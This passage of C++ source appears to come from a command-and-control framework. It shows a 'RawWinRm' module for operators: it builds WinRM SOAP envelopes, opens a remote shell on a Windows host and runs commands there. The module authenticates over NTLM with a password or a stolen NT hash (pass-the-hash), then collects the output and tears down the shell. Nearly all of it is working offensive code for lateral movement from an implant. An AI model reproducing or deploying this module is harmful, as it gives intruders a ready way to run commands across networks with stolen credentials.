        oss << "<a:Action s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action>";
        oss << "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>";
        oss << "<a:MessageID>urn:uuid:" << messageId << "</a:MessageID>";
        oss << "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>";
        oss << "<w:OperationTimeout>PT60.000S</w:OperationTimeout>";
        oss << "<w:SelectorSet><w:Selector Name=\"ShellId\">" << shellId << "</w:Selector></w:SelectorSet>";
        oss << "</s:Header>";
        oss << "<s:Body>";
        oss << "<rsp:Signal CommandId=\"" << commandId << "\">";
        oss << "<rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command/Terminate</rsp:Code>";
        oss << "</rsp:Signal>";
        oss << "</s:Body>";
        oss << "</s:Envelope>";
        return oss.str();
    }

    std::string buildDeleteEnvelope(const std::string& url, const std::string& shellId)
    {
        std::string messageId = randomUuid();
        std::ostringstream oss;
        oss << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
        oss << "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">";
        oss << "<s:Header>";
        oss << "<a:To>" << url << "</a:To>";
        oss << "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>";
        oss << "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>";
        oss << "<a:Action s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>";
        oss << "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>";
        oss << "<a:MessageID>urn:uuid:" << messageId << "</a:MessageID>";
        oss << "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>";
        oss << "<w:OperationTimeout>PT60.000S</w:OperationTimeout>";
        oss << "<w:SelectorSet><w:Selector Name=\"ShellId\">" << shellId << "</w:Selector></w:SelectorSet>";
        oss << "</s:Header>";
        oss << "<s:Body/>";
        oss << "</s:Envelope>";
        return oss.str();
    }

    std::string findTagValue(const std::string& xml, const std::string& tag)
    {
        std::string openTag = "<" + tag + ">";
        std::string closeTag = "</" + tag + ">";
        size_t start = xml.find(openTag);
        if(start == std::string::npos)
        {
            return {};
        }
        start += openTag.size();
        size_t end = xml.find(closeTag, start);
        if(end == std::string::npos)
        {
            return {};
        }
        return xml.substr(start, end - start);
    }

    void parseStreams(const std::string& xml, std::string& stdoutData, std::string& stderrData)
    {
        std::string search = "<rsp:Stream";
        size_t pos = xml.find(search);
        while(pos != std::string::npos)
        {
            size_t namePos = xml.find("Name=\"", pos);
            if(namePos == std::string::npos)
            {
                break;
            }
            namePos += 6;
            size_t nameEnd = xml.find('\"', namePos);
            if(nameEnd == std::string::npos)
            {
                break;
            }
            std::string name = xml.substr(namePos, nameEnd - namePos);
            size_t dataStart = xml.find('>', nameEnd);
            if(dataStart == std::string::npos)
            {
                break;
            }
            ++dataStart;
            size_t dataEnd = xml.find("</rsp:Stream>", dataStart);
            if(dataEnd == std::string::npos)
            {
                break;
            }
            std::string encoded = xml.substr(dataStart, dataEnd - dataStart);
            std::string decoded = base64_decode(encoded);
            if(name == "stdout")
            {
                stdoutData += decoded;
            }
            else if(name == "stderr")
            {
                stderrData += decoded;
            }
            pos = xml.find(search, dataEnd);
        }
    }

    struct CredentialSet
    {
        std::string username;
        std::string domain;
    };

    CredentialSet splitUser(const std::string& fullUser)
    {
        CredentialSet cred;
        auto pos = fullUser.find('\\');
        if(pos != std::string::npos)
        {
            cred.domain = fullUser.substr(0, pos);
            cred.username = fullUser.substr(pos + 1);
        }
        else
        {
            cred.username = fullUser;
        }
        return cred;
    }

#endif
} // namespace

std::string RawWinRm::getInfo()
{
#ifdef BUILD_TEAMSERVER
    return generateUsage();
#else
    return {};
#endif
}

int RawWinRm::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    if(splitedCmd.size() < 6)
    {
        c2Message.set_returnvalue(generateUsage());
        return -1;
    }

    ModuleOptions opts;
    opts.url = splitedCmd[1];
    opts.username = splitedCmd[2];

    size_t idx = 3;
    if(splitedCmd[idx] == "--hash")
    {
        if(splitedCmd.size() < idx + 2)
        {
            c2Message.set_returnvalue(generateUsage());
            return -1;
        }
        opts.secret = splitedCmd[idx + 1];
        opts.secretIsHash = true;
        idx += 2;
    }
    else if(splitedCmd[idx] == "--password")
    {
        if(splitedCmd.size() < idx + 2)
        {
            c2Message.set_returnvalue(generateUsage());
            return -1;
        }
        opts.secret = splitedCmd[idx + 1];
        opts.secretIsHash = false;
        idx += 2;
    }
    else
    {
        opts.secret = splitedCmd[idx];
        opts.secretIsHash = true;
        ++idx;
    }

    while(idx < splitedCmd.size())
    {
        if(splitedCmd[idx] == "--skip-cert-validation")
        {
            opts.disableTlsValidation = true;
            ++idx;
        }
        else if(splitedCmd[idx] == "--workstation" && idx + 1 < splitedCmd.size())
        {
            opts.workstation = splitedCmd[idx + 1];
            idx += 2;
        }
        else
        {
            break;
        }
    }

    if(idx >= splitedCmd.size())
    {
        c2Message.set_returnvalue(generateUsage());
        return -1;
    }

    std::ostringstream cmd;
    for(size_t i = idx; i < splitedCmd.size(); ++i)
    {
        if(i > idx)
        {
            cmd << ' ';
        }
        cmd << splitedCmd[i];
    }
    opts.command = cmd.str();

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packOptions(opts));
    c2Message.set_data(opts.command.data(), opts.command.size());
#endif
    return 0;
}

int RawWinRm::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());

    std::string result;
#ifdef _WIN32
    try
    {
        int error = runCommand(c2Message, result);
        if(error)
        {
            c2RetMessage.set_errorCode(error);
        }
    }
    catch(const std::exception& ex)
    {
        result = ex.what();
        c2RetMessage.set_errorCode(-1);
    }
#else
    result = "Only supported on Windows.\n";
    c2RetMessage.set_errorCode(-1);
#endif

    c2RetMessage.set_returnvalue(result);
    return 0;
}

int RawWinRm::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    if(c2RetMessage.errorCode() != 0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}

int RawWinRm::followUp(const C2Message&)
{
    return 0;
}

#ifdef _WIN32

int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
{
    std::string packed = c2Message.cmd();
    ModuleOptions opts = parsePackedOptions(packed);
    std::string command = c2Message.data();

    if(command.empty())
    {
        throw std::runtime_error("No command provided");
    }

    UrlComponents url = parseUrl(opts.url);
    RawWinRmHttp http(url, opts.disableTlsValidation);

    CredentialSet cred = splitUser(opts.username);
    std::string workstation = opts.workstation;
    if(workstation.empty())
    {
        wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        if(GetComputerNameW(buffer, &size))
        {
            workstation = toNarrow(std::wstring(buffer, size));
        }
        else
        {
            workstation = "WINRM";
        }
    }

    std::vector<uint8_t> ntHash;
    if(opts.secretIsHash)
    {
        ntHash = parseNtHash(opts.secret);
    }
    else
    {
        ntHash = computeNtHashFromPassword(opts.secret);
    }

    std::string shellEnvelope = buildCreateShellEnvelope(opts.url);
    std::string createResponse = http.post(shellEnvelope, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create", cred.username, cred.domain, ntHash, workstation);
    std::string shellId = findTagValue(createResponse, "rsp:ShellId");
    if(shellId.empty())
    {
        throw std::runtime_error("Failed to parse shell identifier");
    }

    std::string commandEnvelope = buildCommandEnvelope(opts.url, shellId, command);
    std::string commandResponse = http.post(commandEnvelope, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command", cred.username, cred.domain, ntHash, workstation);
    std::string commandId = findTagValue(commandResponse, "rsp:CommandId");
    if(commandId.empty())
    {
        throw std::runtime_error("Failed to parse command identifier");
    }

    std::string stdoutData;
    std::string stderrData;
    int exitCode = -1;
    bool commandDone = false;
    for(int attempt = 0; attempt < 12 && !commandDone; ++attempt)
    {
        std::string receiveEnvelope = buildReceiveEnvelope(opts.url, shellId, commandId);
        std::string receiveResponse = http.post(receiveEnvelope, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive", cred.username, cred.domain, ntHash, workstation);
        parseStreams(receiveResponse, stdoutData, stderrData);

        std::string state = findTagValue(receiveResponse, "rsp:CommandState");
        if(!state.empty() && state.find("#Done") != std::string::npos)
        {
            std::string exit = findTagValue(receiveResponse, "rsp:ExitCode");
            if(!exit.empty())
            {
                exitCode = std::stoi(exit);
            }
            commandDone = true;
            break;
        }
        Sleep(500);
    }

    try
    {
        std::string signalEnvelope = buildSignalEnvelope(opts.url, shellId, commandId);
        http.post(signalEnvelope, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal", cred.username, cred.domain, ntHash, workstation);
    }
    catch(...)
    {
    }

    try
    {
        std::string deleteEnvelope = buildDeleteEnvelope(opts.url, shellId);
        http.post(deleteEnvelope, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete", cred.username, cred.domain, ntHash, workstation);
    }
    catch(...)
    {
    }

    std::ostringstream oss;
    if(!stdoutData.empty())
    {
        oss << stdoutData;
    }
    if(!stderrData.empty())
    {
        if(!stdoutData.empty() && stdoutData.back() != '\n')
        {
            oss << '\n';
        }
        oss << stderrData;
    }
    if(exitCode != -1)
    {
        if(oss.tellp() > 0)
        {
            oss << '\n';
        }
        oss << "Exit code: " << exitCode << '\n';
    }
    result = oss.str();
    return 0;
}

#endif
